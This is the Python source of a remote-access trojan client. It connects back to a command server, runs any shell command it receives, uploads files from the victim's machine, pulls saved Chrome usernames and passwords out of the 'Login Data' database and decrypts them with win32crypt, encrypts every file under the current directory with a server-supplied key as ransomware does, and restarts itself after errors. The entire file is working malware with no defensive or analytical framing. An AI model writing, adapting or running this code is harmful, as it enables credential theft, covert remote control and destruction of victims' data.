import socket
import subprocess
import os
import json
import sqlite3
import pickle
import sys
from Mods import run
import threading

try:
    import win32crypt
    win32 = True
except:
    print("import error")
    win32 = False

host = '127.0.0.1'
port = 1234

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


class client:
    def __init__(self, server):
        #server.connect((host, port))
        self.sock = server
        self.sock.connect((host, port))
        self.location = os.getcwd()
        self.hostname = socket.gethostname()
        info = {'HOST':self.hostname, 'LOC':self.location}
        info = json.dumps(info)
        self.sock.send(info.encode())

    def download(self, data):
        self.location = os.getcwd()
        print (self.location)
        path = os.path.join(self.location, data['FILE'])
        try:
            file = open(path, 'rb')
            read = file.read()
            size = json.dumps(len(read))
            print (size)
            self.sock.send(size.encode())
            print(self.sock.recv(1024).decode())
            self.sock.send(read)
            file.close()
            print("done")
        except Exception as e:
            print("error while sending file : %s" %(str(e)))
            self.sock.send(b'error')
    
    def Cpass(self):
        if win32:
            path = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
            connectDB = os.path.join(path, 'Login Data')
            conn = sqlite3.connect(connectDB)
            def extract():
                sqlquery = "SELECT origin_url FROM logins"
                cur = conn.cursor()
                cur.execute(sqlquery)
                f = cur.fetchall()
                URl = []
                for i in range(len(f)):
                    URl.append(f[i][0])

                user = []
                password = []
                for i in URl:
                    sqlquery = "SELECT username_value FROM logins WHERE origin_url=\'%s\'"%(i) 
                    cur.execute(sqlquery)
                    f = cur.fetchall()      
                    user.append(f[0][0])
                    sqlquery = "SELECT password_value FROM logins WHERE origin_url=\'%s\'"%(i)
                    cur.execute(sqlquery)
                    f = cur.fetchall()
                    try:
                        pwd = win32crypt.CryptUnprotectData(f[0][0], None, None, None, 0)
                    except Exception as e:
                        print(e)
                    password.append(pwd[1].decode())
                list = {}
                for i in range(len(URl)):
                    #list.append("USER: {0},     PASS: {1},      URL: {2}".format(user[i], password[i], URl[i]))
                    list[i] = {'USER':user[i], 'PASS':password[i], 'URL':URl[i]}
                return list
            l = extract()
            for i in l:
                print(i)
            return pickle.dumps(l)
        else:
            return pickle.dumps({'USER':'N/A', 'PASS':'N/A', 'URL':'N/A'})
            

    def recv(self):
        try:
            data = self.sock.recv(10240)
            print(data)
            data = json.loads(data)
            if data['DATA'] == 'DOWNLOAD':
                self.download(data)
            elif data['DATA'] == 'CPASS':
                out_data = self.Cpass()
                size = json.dumps(len(out_data))
                print (size)
                self.sock.send(size.encode())
                print(self.sock.recv(1024).decode())
                self.sock.send(out_data)
            
            elif  data['DATA'] == 'Ecrypt':
                self.sock.send(b'do it')
                key = self.sock.recv(2048)
                print (key)
                path = os.getcwd() #val['path']                
                encrpyt = run.encrypt(key)
                dir_walker = run.dir_walk()
                for files in dir_walker.runner(path):
                    th = threading.Thread(target=encrpyt.encrpytor, args=(files,), daemon=True)
                    th.start()
                    
            else:
                out_data = self.execute(data)
                data['DATA'] = out_data
                data['LOC'] = os.getcwd()
                print (data)
                self.send(data)
            return 'good'
        except Exception as e:
            print (" line 102 " + str(e))
            restart_program()
            return 'bad'


    def send(self, data):
        data = json.dumps(data)
        try:
            self.sock.send(data.encode())    
        except Exception as e:
            print (str(e))
   


    def execute(self, data):
        comm = data['DATA']
        print (comm)
        path = (comm.upper()).split()
        if path[0] == 'CD':
            print(path)
            path.pop(0)
            os.chdir(' '.join(path))
            self.location = os.getcwd()
            return os.getcwd()

        else:       
            Output = subprocess.Popen(comm, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            Out = Output.stdout.read() + Output.stderr.read() 
            Output_string = str(Out, 'utf-8')
            print (Output_string)
            return Output_string    

def restart_program():
    print('restarting payload')
    os.execl(sys.executable, sys.executable, *sys.argv)

if __name__ == "__main__":

    while True:
        try:
            sample = client(server)
            while True:
                sample.recv()
        except:
            restart_program()